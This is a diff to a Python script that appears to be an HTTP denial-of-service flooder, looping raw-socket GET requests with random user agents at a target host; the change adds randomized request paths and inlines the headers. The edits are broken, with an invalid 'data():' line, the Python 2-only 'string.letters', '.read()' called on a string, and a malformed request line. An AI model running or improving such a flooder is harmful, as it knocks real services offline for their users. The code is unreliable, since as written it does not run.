@@ -8,7 +8,7 @@
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time,sys,socket,threading,logging,urllib.request,random, string
 
 def user_agent():
 	global uagent
@@ -44,7 +44,13 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			data():
+				chars = string.letters + string.digits
+				dataSize = 5
+				data = ''.join((random.choice(chars)) for x in range(dataSize))\
+				return data
+			data()
+			packet = str("GET /"+data +"HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
@@ -117,7 +123,12 @@ def get_parameters():
 
 # reading headers
 global data
-headers = open("headers.txt", "r")
+headers = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive"""
 data = headers.read()
 headers.close()
 #task queue are q,w
